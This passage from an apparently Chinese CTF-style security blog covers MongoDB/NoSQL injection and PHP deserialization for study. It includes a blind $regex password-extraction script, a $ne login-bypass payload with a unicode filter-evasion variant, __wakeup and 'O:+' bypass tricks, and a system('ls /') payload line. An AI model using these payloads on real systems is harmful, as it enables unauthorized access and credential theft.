username=admin&amp;password[$regex]=^12
username=admin&amp;password[$regex]=^123
username=admin&amp;password[$regex]=^1234
username=admin&amp;password[$regex]=^12345
username=admin&amp;password[$regex]=^123456</code></pre>

<p>这是某个师傅的盲注脚本，贴一下</p>
<pre><code class="highlight plaintext">import requests
import string

password = &#x27;&#x27;
url = &#x27;http://192.168.226.148/index.php&#x27;

while True:
    for c in string.printable:
        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:

            # When the method is GET
            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)
            # When the method is POST
            post_payload = &#123;
                &quot;username&quot;: &quot;admin&quot;,
                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c
            &#125;
            # When the method is POST with JSON
            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
            #headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            r = requests.post(url=url, data=post_payload)
            if &#x27;Login Success&#x27; in r.text:
                print(&quot;[+] %s&quot; % (password + c))
                password += c


# 输出如下: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456</code></pre>

<h3 id="Nodejs中的MongoDB注入"><a href="#Nodejs中的MongoDB注入" class="headerlink" title="Nodejs中的MongoDB注入"></a>Nodejs中的MongoDB注入</h3><p>NodeJS里面的Nosql就主要式重言式注入了，构造永真式密码来实现登陆绕过</p>
<ul>
<li>server.js</li>
</ul>
<pre><code class="highlight plaintext">var express = require(&#x27;express&#x27;);
var mongoose = require(&#x27;mongoose&#x27;);
var jade = require(&#x27;jade&#x27;);
var bodyParser = require(&#x27;body-parser&#x27;);

mongoose.connect(&#x27;mongodb://localhost/test&#x27;, &#123; useNewUrlParser: true &#125;);
var UserSchema = new mongoose.Schema(&#123;
    name: String,
    username: String,
    password: String
&#125;);
var User = mongoose.model(&#x27;users&#x27;, UserSchema);
var app = express();

app.set(&#x27;views&#x27;, __dirname);
app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);

app.get(&#x27;/&#x27;, function(req, res) &#123;
    res.render (&quot;index.jade&quot;,&#123;
        message: &#x27;Please Login&#x27;
    &#125;);
&#125;);

app.use(bodyParser.json());

app.post(&#x27;/&#x27;, function(req, res) &#123;
    console.log(req.body)
    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;
        console.log(user)
        if (err) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: err.message&#125;);
        &#125;
        if (!user) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Login Failed&#x27;&#125;);
        &#125;

        return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Welcome back &#x27; + user.name + &#x27;!&#x27;&#125;);
    &#125;);
&#125;);

var server = app.listen(8000, &#x27;0.0.0.0&#x27;, function () &#123;

    var host = server.address().address
    var port = server.address().port
    console.log(&quot;listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>

<ul>
<li>index.jade</li>
</ul>
<pre><code class="highlight plaintext">h1 #&#123;message&#125;
p #&#123;message&#125;</code></pre>

<p>运行访问，发送</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png" alt="20210724161641-79e9c82a-ec57-1"></p>
<p>成功登录</p>
<p>如果<code>$ne</code>关键字被过滤也可以用unicode来绕过</p>
<p>因为JSON是可以直接解unicode的</p>
<p>belike:</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125;
// &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>





]]></content>
      <tags>
        <tag>-Web -SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
<p>所以会碰到类，对象之类的概念</p>
<p>稍微补充一点罢，不然会听不懂的()</p>
<ul>
<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
<li><strong>对象</strong> − 是类的实例。</li>
<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
  <span class="comment">/* 成员变量 */</span>
  <span class="keyword">var</span> <span class="variable">$url</span>;
  <span class="keyword">var</span> <span class="variable">$title</span>;
  
  <span class="comment">/* 成员函数 */</span>
  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
  &#125;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>

<span class="meta">?&gt;</span></code></pre>

<h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>

<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
<ul>
<li><p>实例</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="variable">$username</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__construct test</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__destruct test</span>
<span class="comment">//__destruct test</span></code></pre></li>
</ul>
<h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
<p>直接输入了<strong>字符串</strong>，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// 重载序列化调用的方法</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span>
        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);
    &#125;

&#125;
<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);
<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;结果就是过滤掉了password的值</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;
    <span class="keyword">private</span> <span class="variable">$order</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// 定义反序列化后调用的方法</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;
    &#125;
&#125;
<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));
<span class="comment">/*</span>
<span class="comment">class User#1 (4) &#123;</span>
<span class="comment">  public $username =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  public $nickname =&gt;</span>
<span class="comment">  string(1) &quot;b&quot;</span>
<span class="comment">  private $password =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  private $order =&gt;</span>
<span class="comment">  NULL</span>
<span class="comment">&#125;</span>
<span class="comment">上面wakeup的函数作用是将username的变量值赋值给password变量。*/</span></code></pre>



<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
<ol>
<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
<li><strong>反序列化对象</strong>与字符串连接时</li>
<li><strong>反序列化对象</strong>参与格式化字符串时</li>
<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
</ol>
<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">echo</span> <span class="variable">$test</span>;
<span class="comment">//__toString</span></code></pre>



<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>();
<span class="comment">//__invoke test</span></code></pre>



<h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取值，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong>，需要一个参数，代表不存在的属性值</p>
<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2;
<span class="meta">?&gt;</span>
    <span class="comment">//var2</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;
<span class="meta">?&gt;</span></code></pre>



<h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><code>__clone()</code></h3><p><code>__clone()</code>:当使用clone关键字拷贝完成一个对象后，新对象就会调用定义的魔术方法(如果存在)</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__clone test</span></code></pre>



<h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset()和__unset"></a><code>__isset()</code>和<code>__unset</code></h3><p><code>__isset()</code>:对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时，<code>__isset()</code>会被调用</p>
<p><code>__unset()</code>:对不可访问属性调用<code>unset()</code>时，<code>__unset()</code>会被触发</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$var</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>



<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过 __wakeup:"></a>绕过 __wakeup:</h3><ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
<p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p>
<p>当然，也可以通过赋值来绕过__wake下面将执行的字符串置空的情况</p>
<p>使另一个构造好的变量和被控制的变量公用一个内存如</p>
<pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;
$t-&gt;b=&amp;$t-&gt;a;
//a未被wakeup置空的变量，执行的也是a,前面还有一个c-&gt;b的过程</code></pre>



<h3 id="绕过-O"><a href="#绕过-O" class="headerlink" title="绕过 O"></a>绕过 O</h3><p>有时会对构造的payload进行正则匹配</p>
<p>此时需要绕过一些必须绕过的关键词，如O</p>
<pre><code class="highlight plaintext">检查O开头的话，可以尝试数组绕过
serialize(array(new Test()))
如果是在整个字符串中检查的话，那没得跑
尝试用一下O+的方法绕过
O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125; =&gt;O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></pre>



<p>gc机制</p>
<h2 id="构链经验"><a href="#构链经验" class="headerlink" title="构链经验:"></a>构链经验:</h2><p>首先，找到注入点，注入点一般 被包裹在最内部(因为第一个执行，通过各种魔术方法将结果成功传输到外部并成功销毁对象)，接着内层的魔术方法要在紧邻的外层得到触发，(也就是为什么他被称为pop链的缘故)，最后成功销毁就算pop链构造成功了</p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p><code>文件上传+文件包含+php反序列化</code>的命运共同体(雾)</p>
<p>先了解一下<code>phar</code>文件</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><ul>
<li><strong>stub文件标识</strong></li>
</ul>
<p>可以理解为一个标志，格式为xxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾，否则phar扩展将无法识别这个文件为phar文件</p>
<ul>
<li><strong>manifest</strong></li>
</ul>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存（当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化(漏洞利用点)</p>
<p><img src="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1937992-20200602115238195-49897280.png" alt="1937992-20200602115238195-49897280"></p>
<ul>
<li><strong>contents</strong></li>
</ul>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p>
<ul>
<li><strong>signature</strong></li>
</ul>
<p>如果修改文件内容，签名就会失效，需要更换一个新的签名，在文件系统函数(<code>file_exist(),is_dir()</code>等)参数可控的情况下，配合phar伪协议就可以不依赖<code>unserialiaze()</code>直接进行反序列化</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1937992-20200602115337297-1986136175.png" alt="1937992-20200602115337297-1986136175"></p>
<blockquote>
<p>[!NOTE]</p>
<p>要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为OFF，否则无法生成</p>
</blockquote>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;
    &#125;
    
    <span class="comment">//@unlink(&quot;phar.phar&quot;);</span>
